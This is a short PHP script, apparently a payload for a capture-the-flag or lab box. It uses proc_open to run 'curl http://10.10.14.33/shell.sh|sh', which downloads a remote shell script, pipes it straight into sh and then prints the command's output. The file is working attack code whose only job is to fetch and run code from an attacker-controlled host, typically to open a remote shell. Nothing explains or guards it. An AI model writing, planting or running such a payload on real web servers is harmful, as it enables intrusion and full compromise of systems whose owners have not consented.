<?php 
$descriptorspec = array(
    0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
    1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
    2 => array("pipe", "w")    // stderr is a pipe that the child will write to
);

$process = proc_open('curl http://10.10.14.33/shell.sh|sh', $descriptorspec, $pipes);

if (is_resource($process)) {
    // Read the output from the child process
    $stdout = stream_get_contents($pipes[1]);
    $stderr = stream_get_contents($pipes[2]);

    // Close the pipes
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);

    // Close the process
    $return_value = proc_close($process);

    echo "stdout: $stdout\n";
    echo "stderr: $stderr\n";
    echo "return value: $return_value\n";
}

?>
